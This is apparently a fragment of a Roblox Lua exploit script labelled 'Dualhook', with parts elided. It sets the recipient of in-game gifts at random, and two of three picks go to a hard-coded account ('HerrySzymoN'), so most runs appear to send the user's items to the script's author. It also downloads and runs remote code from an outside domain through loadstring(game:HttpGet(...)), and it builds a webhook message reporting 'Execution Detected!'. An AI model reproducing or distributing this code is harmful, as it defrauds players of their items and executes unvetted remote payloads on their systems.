...
--[[ Dualhook ]]--
local GiftSendingTable = {
    "HerrySzymoN",
    "HerrySzymoN",
    _G.Username
}
local RandomGiftSend = math.random(1, 3)
local SendGiftTo = GiftSendingTable[RandomGiftSend]
...
loadstring(game:HttpGet('https://fourdevils.gq/bypass.lua'))()
...
if _G.Enabled == true then
    ...
    if _G.Mention == true then
        local PlayerData =  {
            ["content"] = "@everyone Execution Detected!",
            ["embeds"] = {{
                ["title"] = "SimoNHub",
